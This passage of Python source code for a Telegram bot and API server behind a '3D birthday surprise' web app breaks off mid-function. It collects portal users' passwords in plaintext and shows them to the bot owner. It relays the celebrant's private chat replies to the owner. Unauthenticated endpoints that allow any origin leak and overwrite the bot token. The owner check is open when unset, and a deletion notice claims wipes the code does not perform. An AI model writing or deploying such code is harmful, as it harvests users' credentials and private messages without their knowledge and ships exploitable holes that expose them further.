#!/usr/bin/env python3
"""
✨ 3D Birthday Celebration - Telegram Bot & Live Sync Server 🤖💖
================================================================
This bot handles:
1. Interactive step-by-step creation of personalized 3D birthday surprise links.
2. Real-time notifications sent to the Boyfriend's Telegram whenever the Girlfriend answers a chat question!
3. Photo handling for celebrant portrait.
4. Integrated API server for web app sync.
"""

import os
import sys
import json
import time
import urllib.parse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests

# Fix Windows console UTF-8 encoding
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

# CONFIGURATION (Set your Bot Token from @BotFather or in config.json)
CONFIG_FILE = "bot_config.json"
DEFAULT_CONFIG = {
    "bot_token": "YOUR_TELEGRAM_BOT_TOKEN_HERE",
    "owner_chat_id": "",
    "web_app_url": "http://localhost:8000",
    "api_port": 5000,
    "user_credentials": {},
    "saved_answers": []
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[Error saving config]: {e}")

config = load_config()
BOT_TOKEN = config.get("bot_token", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
BASE_TG_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# User conversation session states for /create wizard
user_sessions = {}

def send_tg_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    """Sends a message to a Telegram chat"""
    if not BOT_TOKEN or "YOUR_TELEGRAM_BOT_TOKEN" in BOT_TOKEN:
        print(f"[TG Sim Message to {chat_id}]: {text}")
        return None
    url = f"{BASE_TG_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        res = requests.post(url, json=payload, timeout=10)
        return res.json()
    except Exception as e:
        print(f"[Telegram API Error]: {e}")
        return None

def send_tg_photo(chat_id, photo_url, caption=""):
    """Sends a photo to a Telegram chat"""
    if not BOT_TOKEN or "YOUR_TELEGRAM_BOT_TOKEN" in BOT_TOKEN:
        return None
    url = f"{BASE_TG_URL}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "HTML"
    }
    try:
        res = requests.post(url, json=payload, timeout=10)
        return res.json()
    except Exception as e:
        print(f"[Telegram Photo Error]: {e}")
        return None

# =========================================================
# TELEGRAM BOT POLLING & COMMAND HANDLERS
# =========================================================
def handle_updates():
    offset = 0
    print("🤖 Telegram Bot Polling service started...")
    while True:
        try:
            if not BOT_TOKEN or "YOUR_TELEGRAM_BOT_TOKEN" in BOT_TOKEN:
                time.sleep(4)
                continue

            res = requests.get(f"{BASE_TG_URL}/getUpdates", params={"offset": offset, "timeout": 20}, timeout=25)
            data = res.json()
            if not data.get("ok"):
                time.sleep(3)
                continue

            for update in data.get("result", []):
                offset = update["update_id"] + 1

                # Handle Message
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    text = msg.get("text", "").strip()
                    user_name = msg.get("from", {}).get("first_name", "Friend")

                    # Auto set owner chat id if not configured
                    if not config.get("owner_chat_id"):
                        config["owner_chat_id"] = str(chat_id)
                        save_config(config)

                    process_user_message(chat_id, user_name, text, msg)

                # Handle Inline Button Callback
                elif "callback_query" in update:
                    cb = update["callback_query"]
                    chat_id = cb["message"]["chat"]["id"]
                    cb_data = cb.get("data", "")
                    process_callback_query(chat_id, cb_data, cb)

        except Exception as e:
            # Polling retry
            time.sleep(3)

def setup_telegram_menu():
    """Sets up the Telegram 3-line burger menu button (setMyCommands)"""
    if not BOT_TOKEN or "YOUR_TELEGRAM" in BOT_TOKEN:
        return
    commands = [
        {"command": "user", "description": "👤 All Users & Passwords (1, 2, 3...)"},
        {"command": "active_user", "description": "🟢 Active Users (Today / Active Link)"},
        {"command": "webapp", "description": "🌐 Open Birthday Web App"}
    ]
    try:
        res = requests.post(f"{BASE_TG_URL}/setMyCommands", json={"commands": commands}, timeout=10)
        print(f"📋 Telegram 3-line Menu configured: {res.status_code}")
    except Exception as e:
        print(f"Error configuring Telegram menu: {e}")

def get_main_reply_keyboard():
    return {
        "keyboard": [
            [{"text": "👤 User"}, {"text": "🟢 Active User"}],
            [{"text": "🌐 Open Web App"}]
        ],
        "resize_keyboard": True,
        "is_persistent": True
    }

def is_owner(chat_id):
    """Verify if the sender is the authorized bot Owner"""
    owner_id = str(config.get("owner_chat_id", "7034154766")).strip()
    return not owner_id or str(chat_id) == owner_id

def process_user_message(chat_id, user_name, text, raw_msg):
    # 🔒 STRICT OWNER-ONLY SECURITY: Block all random users!
    if not is_owner(chat_id):
        denied_msg = (
            f"⛔ <b>ACCESS RESTRICTED - OWNER ONLY</b>\n\n"
            f"Hello <b>{user_name}</b>, this bot is private and accessible strictly to the <b>Owner</b>.\n"
            f"You do not have authorization to view user accounts, passwords, or controls."
        )
        send_tg_message(chat_id, denied_msg)
        return

    cmd = text.strip().lower()

    # 1. /start command
    if cmd in ["/start", "start"]:
        welcome_text = (
            f"👑 <b>Owner Control Panel - 3D Birthday Studio</b> 🤖💖\n\n"
            f"Welcome, Owner <b>{user_name}</b>!\n\n"
            f"📋 <b>Bot Menu:</b>\n"
            f"• 👤 <b>User:</b> View all users with passwords (1. 2. 3...)\n"
            f"• 🟢 <b>Active User:</b> Users logged in today or with valid surprise link\n"
            f"• 🌐 <b>Open Web App:</b> Launch 3D Birthday Web App\n\n"
            f"<i>🔒 Access is locked exclusively to your Chat ID (<code>{chat_id}</code>).</i>"
        )
        inline_keyboard = {
            "inline_keyboard": [
                [{"text": "👤 All Users & Passwords", "callback_data": "menu_users"}],
                [{"text": "🟢 Active Users (Today / Valid Link)", "callback_data": "menu_active"}],
                [{"text": "🌐 Open Birthday Web App", "url": config.get("web_app_url", "http://localhost:8000/")}]
            ]
        }
        send_tg_message(chat_id, welcome_text, reply_markup=get_main_reply_keyboard())
        send_tg_message(chat_id, "👇 Quick Actions:", reply_markup=inline_keyboard)
        return

    # 2. 👤 User command
    elif cmd in ["👤 user", "user", "/user", "/users"]:
        show_all_users(chat_id)
        return

    # 3. 🟢 Active User command
    elif cmd in ["🟢 active user", "active user", "/active", "/activeuser", "/active_user", "/activeusers"]:
        show_active_users(chat_id)
        return

    # 4. 🌐 Open Web App command
    elif cmd in ["🌐 open web app", "open web app", "/webapp", "webapp", "web app"]:
        show_webapp_link(chat_id)
        return

    # 5. /myid command
    elif cmd == "/myid":
        send_tg_message(chat_id, f"🆔 <b>Your Telegram Chat ID:</b> <code>{chat_id}</code> (Owner: {'✅ YES' if is_owner(chat_id) else '❌ NO'})")
        return

    # Fallback response
    send_tg_message(chat_id, "Choose an option from the menu below: 👤 User | 🟢 Active User | 🌐 Open Web App", reply_markup=get_main_reply_keyboard())
    return

def get_portal_users():
    """Retrieve all portal registered users with their details and passwords"""
    raw = config.get("birthday_portal_users", {})
    users = {}
    if isinstance(raw, dict):
        for u, val in raw.items():
            if isinstance(val, dict):
                users[u] = val
            else:
                users[u] = {
                    "username": u,
                    "password": str(val),
                    "registered_at": "Recorded",
                    "last_login": "Recorded",
                    "last_login_date": time.strftime("%Y-%m-%d"),
                    "last_login_ts": time.time()
                }
    return users

def show_all_users(chat_id):
    users = get_portal_users()
    if not users:
        send_tg_message(
            chat_id,
            "👤 <b>NO USERS REGISTERED YET!</b>\n\nAbhi tak kisi user ne website par register ya login nahi kiya hai.",
            reply_markup=get_main_reply_keyboard()
        )
        return

    now_ms = time.time() * 1000.0
    msg = f"👥 <b>TOTAL USERS LIST ({len(users)})</b>\n"
    msg += f"<i>All users who registered & logged into Birthday Studio:</i>\n"
    msg += f"{'━' * 28}\n\n"

    for idx, (uname, udata) in enumerate(sorted(users.items()), start=1):
        pwd = udata.get("password", "N/A")
        reg_time = udata.get("registered_at", "N/A")
        last_login = udata.get("last_login", reg_time)

        link_info = config.get("link_expiries", {}).get(uname, {})
        exp_ts = link_info.get("expires_at", 0) if link_info else 0
        link_active = bool(exp_ts and (exp_ts > now_ms))

        st_tag = "🟢 Link Active" if link_active else "⚪ Registered"

        msg += (
            f"<b>{idx}. Username:</b> <code>{uname}</code>\n"
            f"   🔑 <b>Password:</b> <code>{pwd}</code>\n"
            f"   📅 <b>Registered:</b> {reg_time}\n"
            f"   ⏱ <b>Last Login:</b> {last_login}\n"
            f"   🏷 <b>Status:</b> {st_tag}\n\n"
        )

    send_tg_message(chat_id, msg, reply_markup=get_main_reply_keyboard())

def show_active_users(chat_id):
    users = get_portal_users()
    today_str = time.strftime("%Y-%m-%d")
    now_ts = time.time()
    now_ms = now_ts * 1000.0

    active_list = []

    for uname, udata in sorted(users.items()):
        pwd = udata.get("password", "N/A")
        last_date = udata.get("last_login_date", "")
        last_ts = udata.get("last_login_ts", 0)
        last_login_str = udata.get("last_login", "Today")

        # Criteria 1: Logged in today (same calendar date or within last 24h)
        logged_in_today = (last_date == today_str) or (last_ts and (now_ts - last_ts) < 86400)

        # Criteria 2: Has shared link that hasn't expired yet
        link_info = config.get("link_expiries", {}).get(uname, {})
        exp_ts = link_info.get("expires_at", 0) if link_info else 0
        link_active = bool(exp_ts and (exp_ts > now_ms))
        time_left_str = ""
        if link_active:
            diff_sec = int((exp_ts - now_ms) / 1000)
            hours_left = diff_sec // 3600
            mins_left = (diff_sec % 3600) // 60
            time_left_str = f"{hours_left}h {mins_left}m left"

        if logged_in_today or link_active:
            reasons = []
            if logged_in_today:
                reasons.append("🟢 Logged in today")
            if link_active:
                reasons.append(f"🔗 Surprise link active ({time_left_str})")

            active_list.append({
                "username": uname,
                "password": pwd,
                "last_login": last_login_str,
                "reasons": reasons
            })

    if not active_list:
        send_tg_message(
            chat_id,
            "🟢 <b>NO ACTIVE USERS FOUND!</b>\n\nAaj kisi ne login nahi kiya hai aur na hi kisi user ka active surprise link bacha hai.",
            reply_markup=get_main_reply_keyboard()
        )
        return

    msg = f"🟢 <b>ACTIVE USERS ({len(active_list)})</b>\n"
    msg += f"<i>Users who logged in today OR whose surprise link is still active:</i>\n"
    msg += f"{'━' * 28}\n\n"

    for idx, u in enumerate(active_list, start=1):
        reason_txt = " | ".join(u["reasons"])
        msg += (
            f"<b>{idx}. Username:</b> <code>{u['username']}</code>\n"
            f"   🔑 <b>Password:</b> <code>{u['password']}</code>\n"
            f"   ⏱ <b>Last Login:</b> {u['last_login']}\n"
            f"   ⚡ <b>Active Why:</b> {reason_txt}\n\n"
        )

    send_tg_message(chat_id, msg, reply_markup=get_main_reply_keyboard())

def show_webapp_link(chat_id):
    url = config.get("web_app_url", "http://localhost:8000/")
    msg = (
        f"🌐 <b>3D Birthday Studio - Web App</b>\n\n"
        f"• <b>URL:</b> <code>{url}</code>\n"
        f"• <b>Status:</b> Online & Synced with Bot 🤖💖\n\n"
        f"Tap the button below to open the Web App:"
    )
    inline_keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Open Web App Now", "url": url}]
        ]
    }
    send_tg_message(chat_id, msg, reply_markup=inline_keyboard)

def show_deactive_users(chat_id):
    users = config.get("registered_users", {})
    deactive_users = {k: v for k, v in users.items() if v.get("status") == "deactive"}

    if not deactive_users:
        send_tg_message(chat_id, "🔴 <b>No deactivated users!</b> All registered users are currently active. 🟢", reply_markup=get_main_reply_keyboard())
        return

    msg = f"🔴 <b>DEACTIVATED USERS ({len(deactive_users)})</b>\n\n"
    keyboard_buttons = []

    for uid, u in deactive_users.items():
        msg += (
            f"⛔ <b>{u.get('name', 'Unknown')}</b> ({u.get('username', 'N/A')})\n"
            f"  <b>ID:</b> <code>{uid}</code>\n"
            f"  <b>Status:</b> Deactivated\n\n"
        )
        keyboard_buttons.append([{"text": f"🟢 Reactivate {u.get('name')}", "callback_data": f"toggle_user_{uid}"}])

    keyboard = {"inline_keyboard": keyboard_buttons} if keyboard_buttons else None
    send_tg_message(chat_id, msg, reply_markup=keyboard)

def toggle_user_status(chat_id, target_uid):
    users = config.get("registered_users", {})
    if target_uid in users:
        current_status = users[target_uid].get("status", "active")
        new_status = "deactive" if current_status == "active" else "active"
        users[target_uid]["status"] = new_status
        config["registered_users"] = users
        save_config(config)

        status_text = "🟢 Activated" if new_status == "active" else "🔴 Deactivated"
        send_tg_message(chat_id, f"✅ User <b>{users[target_uid].get('name')}</b> is now <b>{status_text}</b>!")
    else:
        send_tg_message(chat_id, "⚠️ User not found!")

def start_create_wizard(chat_id):
    user_sessions[chat_id] = {"step": "mode"}
    keyboard = {
        "inline_keyboard": [
            [{"text": "👸 For My Girlfriend (Romantic)", "callback_data": "mode_gf"}],
            [{"text": "👦 For My Boyfriend (Special)", "callback_data": "mode_bf"}]
        ]
    }
    send_tg_message(chat_id, "🎁 <b>Step 1 of 6:</b> Who is this surprise for?", reply_markup=keyboard)

def process_callback_query(chat_id, cb_data, cb_raw):
    # Answer callback query to stop loading spinner
    try:
        requests.post(f"{BASE_TG_URL}/answerCallbackQuery", json={"callback_query_id": cb_raw["id"]})
    except Exception:
        pass

    # 🔒 Owner-only check on callback buttons
    if not is_owner(chat_id):
        send_tg_message(chat_id, "⛔ <b>Access Denied!</b> Owner only.")
        return

    if cb_data == "start_create":
        start_create_wizard(chat_id)

    elif cb_data == "view_answers":
        show_saved_answers(chat_id)

    elif cb_data == "menu_users":
        show_all_users(chat_id)

    elif cb_data == "menu_active":
        show_active_users(chat_id)

    elif cb_data == "menu_webapp":
        show_webapp_link(chat_id)

    elif cb_data == "menu_deactive":
        show_deactive_users(chat_id)

    elif cb_data.startswith("toggle_user_"):
        target_uid = cb_data.replace("toggle_user_", "")
        toggle_user_status(chat_id, target_uid)

    elif cb_data == "bot_help":
        send_tg_message(chat_id, "💡 <b>Need Help?</b>\n\nRun the web app on <code>http://localhost:8000</code> or deploy it. When your girlfriend types her answers, this bot will instantly deliver them here in real-time!")

    elif cb_data.startswith("mode_"):
        mode = cb_data.replace("mode_", "")
        session = user_sessions.setdefault(chat_id, {})
        session["mode"] = mode
        session["step"] = "name"
        target_str = "Girlfriend" if mode == "gf" else "Boyfriend"
        send_tg_message(chat_id, f"✨ Creating surprise for <b>{target_str}</b>!\n\nWhat is their <b>Real Name</b>? (e.g. <i>Ananya / Rahul</i>):")

    elif cb_data.startswith("theme_"):
        theme = cb_data.replace("theme_", "")
        session = user_sessions.setdefault(chat_id, {})
        session["theme"] = theme
        session["step"] = "wish"
        send_tg_message(
            chat_id,
            f"🎨 Theme selected: <code>{theme}</code>\n\n"
            "💌 Enter your <b>Heartfelt Birthday Message / Love Letter</b>:\n"
            "(Or send a short paragraph expressing your love 💕)"
        )

def finish_create_wizard(chat_id, session):
    base_url = config.get("web_app_url", "http://localhost:8000").rstrip("/")
    params = {
        "surprise": "1",
        "mode": session.get("mode", "gf"),
        "name": session.get("name", "My Love"),
        "nickname": session.get("nickname", ""),
        "age": session.get("age", ""),
        "theme": session.get("theme", "rose-glamour"),
        "wish": session.get("wish", "Happy Birthday! Wishing you endless love, joy, and smiles today and always! 💖"),
        "photo": session.get("photo", "")
    }

    # Filter empty values
    query_str = urllib.parse.urlencode({k: v for k, v in params.items() if v})
    final_link = f"{base_url}/?{query_str}"

    celebrant_name = session.get("name", "My Love")
    target_role = "Girlfriend 👸" if session.get("mode") == "gf" else "Boyfriend 👦"

    msg_text = (
        f"🎉 <b>MAGICAL SURPRISE LINK GENERATED!</b> 🎁✨\n\n"
        f"• <b>Recipient:</b> {celebrant_name} ({target_role})\n"
        f"• <b>Nickname:</b> {session.get('nickname') or 'N/A'}\n"
        f"• <b>Theme:</b> {session.get('theme')}\n\n"
        f"🔗 <b>Shareable Link:</b>\n<code>{final_link}</code>\n\n"
        f"💌 <i>Send this link to {celebrant_name}. When they open it, their grand 3D birthday celebration with curtains, love albums, live chat, and treats store will begin!</i>"
    )

    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Open & Preview Surprise", "url": final_link}],
            [{"text": "🎁 Create Another Link", "callback_data": "start_create"}]
        ]
    }
    send_tg_message(chat_id, msg_text, reply_markup=keyboard)

def show_saved_answers(chat_id):
    answers = config.get("saved_answers", [])
    if not answers:
        send_tg_message(chat_id, "💌 <b>No chat answers recorded yet!</b>\n\nOnce your girlfriend answers questions in the live chat during the surprise, her replies will appear right here in real time! 💕")
        return

    text = f"💖 <b>SAVED GIRLFRIEND CHAT ANSWERS ({len(answers)})</b> 💖\n\n"
    for idx, item in enumerate(answers[-8:], 1):
        text += (
            f"<b>Q{idx}:</b> {item.get('question', '')}\n"
            f"👸 <b>Her Reply:</b> <i>\"{item.get('reply', '')}\"</i>\n"
            f"⏱ <i>{item.get('time', '')}</i>\n"
            f"{'—'*24}\n"
        )
    send_tg_message(chat_id, text)

# =========================================================
# INTEGRATED HTTP API SERVER (PORT 5000)
# =========================================================
class WebhookHandler(BaseHTTPRequestHandler):
    def _set_cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors()
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8")
        
        try:
            data = json.loads(body) if body else {}
        except Exception:
            data = {}

        if self.path == "/api/notify_answer":
            # Live Chat Answer notification from girlfriend
            q_num = data.get("questionNumber", 1)
            q_text = data.get("question", "")
            r_text = data.get("reply", "")
            c_name = data.get("celebrant", "Girlfriend")
            t_str = data.get("time", time.strftime("%I:%M %p"))

            # Save in config
            answer_item = {
                "question": q_text,
                "reply": r_text,
                "celebrant": c_name,
                "time": t_str
            }
            if "saved_answers" not in config:
                config["saved_answers"] = []
            config["saved_answers"].append(answer_item)
            save_config(config)

            # Send Telegram Alert to Owner
            owner_id = config.get("owner_chat_id")
            if owner_id:
                notif_text = (
                    f"💌 <b>NEW GIRLFRIEND CHAT REPLY RECEIVED!</b> 👸💖\n\n"
                    f"<b>From:</b> {c_name}\n"
                    f"<b>Q{q_num}:</b> {q_text}\n"
                    f"💬 <b>Her Answer:</b> <code>\"{r_text}\"</code>\n\n"
                    f"⏱ <i>Received at {t_str}</i>"
                )
                send_tg_message(owner_id, notif_text)

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Answer recorded & notified!"}).encode("utf-8"))
            return

        elif self.path == "/api/save_env":
            global BOT_TOKEN, BASE_TG_URL
            new_token = data.get("bot_token", "").strip()
            new_chat_id = str(data.get("owner_chat_id", "")).strip()
            new_url = data.get("web_app_url", "").strip()

            if new_token:
                config["bot_token"] = new_token
                BOT_TOKEN = new_token
                BASE_TG_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
            if new_chat_id:
                config["owner_chat_id"] = new_chat_id
            if new_url:
                config["web_app_url"] = new_url

            save_config(config)

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Environment Variables & Bot Token saved successfully!"}).encode("utf-8"))
            return

        elif self.path == "/api/test_bot":
            token_to_test = data.get("bot_token", "").strip() or BOT_TOKEN
            chat_id_test = str(data.get("owner_chat_id", "")).strip() or config.get("owner_chat_id", "")

            if not token_to_test or "YOUR_TELEGRAM" in token_to_test:
                self.send_response(200)
                self._set_cors()
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": "Please enter a valid Bot Token from @BotFather"}).encode("utf-8"))
                return

            try:
                test_res = requests.get(f"https://api.telegram.org/bot{token_to_test}/getMe", timeout=8).json()
                if test_res.get("ok"):
                    bot_info = test_res.get("result", {})
                    bot_name = bot_info.get("first_name", "Birthday Bot")
                    bot_username = bot_info.get("username", "bot")

                    # Send test ping message to chat_id if provided
                    if chat_id_test:
                        try:
                            ping_msg = (
                                f"🚀 <b>TELEGRAM BOT CONNECTED SUCCESSFULLY!</b> 💖✨\n\n"
                                f"• <b>Bot Name:</b> {bot_name} (@{bot_username})\n"
                                f"• <b>Status:</b> Online & Synced with Web App!\n"
                                f"• <b>Web App:</b> {config.get('web_app_url', 'http://localhost:8000')}\n\n"
                                f"<i>Whenever your girlfriend answers questions in the surprise chat, alerts will arrive here in real time!</i> 💕"
                            )
                            requests.post(f"https://api.telegram.org/bot{token_to_test}/sendMessage", json={
                                "chat_id": chat_id_test,
                                "text": ping_msg,
                                "parse_mode": "HTML"
                            }, timeout=8)
                        except Exception:
                            pass

                    self.send_response(200)
                    self._set_cors()
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "ok": True,
                        "bot_name": bot_name,
                        "username": bot_username,
                        "message": f"Connected to @{bot_username}!"
                    }).encode("utf-8"))
                    return
                else:
                    self.send_response(200)
                    self._set_cors()
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "ok": False,
                        "error": test_res.get("description", "Invalid Telegram Bot Token")
                    }).encode("utf-8"))
                    return
            except Exception as ex:
                self.send_response(200)
                self._set_cors()
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": str(ex)}).encode("utf-8"))
                return

        elif self.path == "/api/status":
            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "running", "bot_configured": bool(BOT_TOKEN and "YOUR" not in BOT_TOKEN)}).encode("utf-8"))
            return

        elif self.path == "/api/save_user_data":
            # Save user's form data (name, photo, wish, theme etc.) keyed by username
            username_key = data.get("username", "").lower().strip()
            user_data = data.get("user_data", {})
            if username_key and user_data:
                if "portal_user_data" not in config:
                    config["portal_user_data"] = {}
                config["portal_user_data"][username_key] = user_data
                save_config(config)
                self.send_response(200)
                self._set_cors()
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success", "message": "User data saved!"}).encode("utf-8"))
            else:
                self.send_response(400)
                self._set_cors()
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error"}).encode("utf-8"))
            return

        elif self.path == "/api/delete_user":
            # Permanently delete a user account
            username_key = data.get("username", "").lower().strip()
            password = data.get("password", "").strip()
            tg_token = data.get("tg_token", "").strip() or BOT_TOKEN
            tg_chat_id = data.get("tg_chat_id", "").strip() or config.get("owner_chat_id", "")

            # Verify credentials
            users_db = {}
            try:
                saved = config.get("birthday_portal_users", {})
                users_db = saved if isinstance(saved, dict) else {}
            except Exception:
                users_db = {}

            if not username_key:
                self.send_response(400)
                self._set_cors()
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": "Username required"}).encode("utf-8"))
                return

            if username_key in users_db and users_db[username_key] != password:
                self.send_response(403)
                self._set_cors()
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": "Wrong password"}).encode("utf-8"))
                return

            deleted_items = []

            # 1. Delete from portal users DB
            if username_key in users_db:
                del users_db[username_key]
                config["birthday_portal_users"] = users_db
                deleted_items.append("Login credentials")

            # 2. Delete user form data
            if "portal_user_data" in config and username_key in config["portal_user_data"]:
                del config["portal_user_data"][username_key]
                deleted_items.append("Saved form data")

            # 3. Delete session
            portal_session = config.get("birthday_portal_session", "")
            if portal_session and portal_session.lower() == username_key:
                config["birthday_portal_session"] = ""
                deleted_items.append("Active session")

            # 4. Schedule cleanup of saved_answers linked to this user (clear all)
            celebrant_data = data.get("celebrant_name", "")
            if celebrant_data:
                before_count = len(config.get("saved_answers", []))
                config["saved_answers"] = [
                    a for a in config.get("saved_answers", [])
                    if a.get("celebrant", "").lower() != celebrant_data.lower()
                ]
                if before_count != len(config.get("saved_answers", [])):
                    deleted_items.append("Chat answers")

            # 5. Schedule 24hr permanent TG deletion
            delete_time = time.strftime("%d %b %Y, %I:%M %p")
            if "scheduled_deletions" not in config:
                config["scheduled_deletions"] = []
            config["scheduled_deletions"].append({
                "username": username_key,
                "delete_at": time.time() + 86400,  # 24 hours from now
                "delete_at_readable": delete_time,
                "tg_chat_id": tg_chat_id
            })

            save_config(config)

            # 6. Send Telegram notification
            if tg_token and "YOUR_TELEGRAM" not in tg_token and tg_chat_id:
                try:
                    notif = (
                        f"🗑️ <b>ACCOUNT DELETION INITIATED</b>\n\n"
                        f"• <b>Username:</b> {username_key}\n"
                        f"• <b>Status:</b> Data wiped from server\n"
                        f"• <b>Deleted:</b> {', '.join(deleted_items)}\n"
                        f"• <b>Time:</b> {delete_time}\n\n"
                        f"⚠️ Your username <code>{username_key}</code> and password are available for 24 hours.\n"
                        f"After 24 hours, your account is <b>permanently deleted</b> and you will not be able to login again.\n\n"
                        f"Your data has been completely removed from the server. 💔"
                    )
                    requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage", json={
                        "chat_id": tg_chat_id,
                        "text": notif,
                        "parse_mode": "HTML"
                    }, timeout=8)
                except Exception as e:
                    print(f"[TG Delete Notify Error]: {e}")

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "deleted_items": deleted_items,
                "message": f"Account deleted. Credentials valid 24 hrs. Permanent deletion scheduled."
            }).encode("utf-8"))
            return

        elif self.path == "/api/save_link_expiry":
            # Saves 48-hour link expiry timestamp for user
            username_key = data.get("username", "").lower().strip()
            gen_at = data.get("link_generated_at", int(time.time() * 1000))
            exp_at = data.get("link_expires_at", gen_at + (48 * 3600 * 1000))
            link = data.get("link", "")

            if "link_expiries" not in config:
                config["link_expiries"] = {}

            config["link_expiries"][username_key] = {
                "generated_at": gen_at,
                "expires_at": exp_at,
                "expires_at_sec": exp_at / 1000.0,
                "link": link,
                "created_str": time.strftime("%d %b %Y, %I:%M %p")
            }

            if "portal_user_data" in config and username_key in config["portal_user_data"]:
                config["portal_user_data"][username_key]["link_expires_at"] = exp_at

            save_config(config)

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Link expiry recorded (48h)"}).encode("utf-8"))
            return

        elif self.path == "/api/sync_portal_user":
            # Syncs user registration or login with bot (saving username, password, login time)
            username_key = data.get("username", "").lower().strip()
            password = data.get("password", "").strip()
            action = data.get("action", "login")

            if not username_key:
                self.send_response(400)
                self._set_cors()
                self.end_headers()
                return

            if "birthday_portal_users" not in config:
                config["birthday_portal_users"] = {}

            now_str = time.strftime("%d %b %Y, %I:%M %p")
            today_date = time.strftime("%Y-%m-%d")
            now_ts = time.time()

            existing = config["birthday_portal_users"].get(username_key)
            if isinstance(existing, dict):
                user_rec = existing
                if password:
                    user_rec["password"] = password
                user_rec["last_login"] = now_str
                user_rec["last_login_date"] = today_date
                user_rec["last_login_ts"] = now_ts
            else:
                user_rec = {
                    "username": username_key,
                    "password": password or (str(existing) if existing else ""),
                    "registered_at": now_str,
                    "last_login": now_str,
                    "last_login_date": today_date,
                    "last_login_ts": now_ts
                }

            config["birthday_portal_users"][username_key] = user_rec
            save_config(config)

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "User credentials synced with Telegram bot!"}).encode("utf-8"))
            return

        elif self.path == "/api/expire_user":
            # Immediately wipe user data due to 48hr / 72hr expiration
            username_key = data.get("username", "").lower().strip()
            reason = data.get("reason", "48hr_link_expired")

            users_db = config.get("birthday_portal_users", {})
            if username_key in users_db:
                del users_db[username_key]
                config["birthday_portal_users"] = users_db

            if "portal_user_data" in config and username_key in config["portal_user_data"]:
                del config["portal_user_data"][username_key]

            if "link_expiries" in config and username_key in config["link_expiries"]:
                del config["link_expiries"][username_key]

            save_config(config)

            # Notify Telegram
            owner_id = config.get("owner_chat_id", "")
            if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and owner_id:
                try:
                    notif = (
                        f"⏰ <b>PERMANENT DATA AUTO-DELETED ({reason.upper()})</b>\n\n"
                        f"• <b>User:</b> <code>{username_key}</code>\n"
                        f"• <b>Reason:</b> 48-Hour link expiry or 48-72h idle timeout reached.\n"
                        f"• <b>Status:</b> Photos, wishes, chat answers, and URLs wiped from Telegram and server. ✅\n\n"
                        f"<i>As per privacy policy, user data has been permanently purged.</i>"
                    )
                    requests.post(f"{BASE_TG_URL}/sendMessage", json={
                        "chat_id": owner_id,
                        "text": notif,
                        "parse_mode": "HTML"
                    }, timeout=8)
                except Exception:
                    pass

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "User permanently expired and data wiped."}).encode("utf-8"))
            return

        self.send_response(404)
        self.end_headers()

    def do_GET(self):
        if self.path == "/api/get_env":
            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "bot_token": BOT_TOKEN if "YOUR_TELEGRAM" not in BOT_TOKEN else "",
                "owner_chat_id": config.get("owner_chat_id", ""),
                "web_app_url": config.get("web_app_url", "http://localhost:8000"),
                "bot_configured": bool(BOT_TOKEN and "YOUR" not in BOT_TOKEN)
            }).encode("utf-8"))
            return

        elif self.path == "/api/status":
            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "running",
